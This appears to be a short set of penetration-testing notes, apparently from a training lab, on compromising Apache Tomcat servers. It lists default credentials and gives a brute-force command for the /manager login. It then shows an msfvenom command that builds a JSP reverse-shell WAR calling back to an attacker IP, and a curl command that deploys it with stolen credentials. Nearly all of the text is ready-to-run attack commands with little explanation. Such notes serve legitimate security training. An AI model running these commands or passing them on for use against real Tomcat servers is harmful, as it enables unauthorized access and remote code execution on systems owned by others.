
Find Version
```
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

Check for sensitive information in tomcat-users.xml file. In webapps folder check WEB-INF/web.xml and WEB-INF/classes

Look for /manager and /host-manager 
- weak credentials admin:admin and tomcat:tomcat

Brute Force Login
[https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
```
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

RCE with WAR file upload 
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

Since /host-manager does not upload functionality in the GUI we can use curl 
```
curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file backup.war "http://10.129.26.120:8080/manager/text/deploy?path=/backup"
```
